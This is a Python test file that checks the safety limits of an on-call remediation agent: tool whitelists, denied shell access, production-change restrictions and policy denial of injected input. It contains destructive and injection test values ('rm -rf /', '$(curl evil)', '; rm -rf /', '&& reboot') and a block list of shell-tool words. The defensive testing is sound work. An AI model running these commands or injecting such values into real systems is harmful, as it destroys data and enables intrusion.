"""Safety: no arbitrary shell, no unknown tools, no unauthorized production changes."""
import asyncio
import importlib
from pathlib import Path

import pytest
import yaml

from oncall_core.config import from_dict
from oncall_core.events import parse_event
from oncall_core.policy import ACTIONS, DENY, RemediationPolicy
from oncall_mcp import SERVERS
from oncall_mcp.common import Context
from oncall_mcp.servers.remediation import RemediationService

ROOT = Path(__file__).resolve().parents[1]
AGENT = yaml.safe_load((ROOT / "dist" / "oncall-agent.yaml").read_text())
FORBIDDEN_TOOL_WORDS = ("shell", "run_", "command", "bash", "script", "eval", "kubectl", "ssh", "sql", "http_request")


def _tools(server: str, config) -> list:
    mod = importlib.import_module(f"oncall_mcp.servers.{server}")
    return asyncio.run(mod.build(Context(config)).list_tools())


# ------------------------------------------------------------------ agent definition
def test_no_agent_has_a_shell_or_filesystem_toolset():
    for name, agent in AGENT["agents"].items():
        for ts in agent.get("toolsets", []):
            assert ts.get("type") not in ("shell", "filesystem", "script", "api", "fetch"), f"{name}: {ts}"


def test_permissions_deny_shell_and_fail_closed():
    perms = AGENT["permissions"]
    assert "shell" in perms["deny"] and "write_file" in perms["deny"]
    assert AGENT["runtime"]["safety"] == "restricted"


def test_every_mcp_toolset_uses_an_explicit_tool_whitelist():
    for name, agent in AGENT["agents"].items():
        for ts in agent.get("toolsets", []):
            if ts.get("type") == "mcp" or ts.get("ref") or ts.get("remote"):
                assert ts.get("tools"), f"{name} exposes a whole MCP server: {ts}"


def test_only_remediation_specialist_can_change_production():
    production = {"restart_service", "rollback_deployment", "scale_service", "failover_dependency",
                  "enable_circuit_breaker", "disable_feature_flag", "execute_approved_action"}
    for name, agent in AGENT["agents"].items():
        granted = {t for ts in agent.get("toolsets", []) for t in ts.get("tools", [])}
        if name != "remediation":
            assert not granted & production, f"{name} can call {granted & production}"


def test_no_secrets_in_agent_definition():
    text = (ROOT / "dist" / "oncall-agent.yaml").read_text()
    for marker in ("sk-ant-", "xoxb-", "ghp_", "BEGIN PRIVATE KEY", "password:"):
        assert marker not in text


# ------------------------------------------------------------------------ MCP servers
@pytest.mark.parametrize("server", SERVERS)
def test_mcp_servers_expose_no_generic_execution_tool(server, config):
    for tool in _tools(server, config):
        assert not any(w in tool.name for w in FORBIDDEN_TOOL_WORDS), f"{server}.{tool.name}"


def test_remediation_tools_are_exactly_the_typed_actions(config):
    names = {t.name for t in _tools("remediation", config)}
    assert names == set(ACTIONS) | {"list_remediation_capabilities", "get_remediation_status", "execute_approved_action"}
    for t in _tools("remediation", config):
        if t.name in ACTIONS:
            assert t.annotations.destructive_hint is True


def test_unknown_tool_is_rejected(config):
    mod = importlib.import_module("oncall_mcp.servers.remediation")
    server = mod.build(Context(config))
    with pytest.raises(Exception):
        asyncio.run(server.call_tool("run_shell", {"command": "rm -rf /"}))


# ------------------------------------------------------------------- policy boundary
@pytest.mark.parametrize("params", [
    {"service": "checkout-api; rm -rf /"},
    {"service": "$(curl evil)"},
    {"service": "checkout-api && reboot"},
    {"service": "a\nb"},
])
def test_shell_metacharacters_are_denied(params):
    d = RemediationPolicy({"remediation": "automatic"}, {"allowed_services": ["*"]}).evaluate(
        "restart_service", params, confidence=1)
    assert d.outcome == DENY


def test_unknown_action_is_denied():
    d = RemediationPolicy({"remediation": "automatic"}, {}).evaluate("run_command", {"cmd": "ls"}, confidence=1)
    assert d.outcome == DENY and "typed" in d.reason


def test_unauthorized_remediation_is_denied_and_never_executed(tmp_path, event):
    cfg = from_dict({"state": {"backend": "sqlite", "url": str(tmp_path / "s.db")},
                     "autonomy": {"mode": "read-only"},
                     "integrations": {"remediation": {"provider": "mock", "data": {}}}})
    ctx = Context(cfg)
    ctx.store.ingest_event(parse_event(event()))
    out = RemediationService(ctx).request("INC-1", "restart_service", {"service": "checkout-api"}, "x", [], 1.0)
    assert out["status"] == "denied"
    assert ctx.provider("remediation").executed == []
    assert any(a["action"] == "remediation.deny" for a in ctx.store.audit_log("INC-1"))


def test_service_outside_allowlist_is_denied(config, event):
    ctx = Context(config)
    ctx.store.ingest_event(parse_event(event()))
    out = RemediationService(ctx).request("INC-1", "restart_service", {"service": "ledger-db"}, "x", [], 1.0)
    assert out["status"] == "denied" and ctx.provider("remediation").executed == []
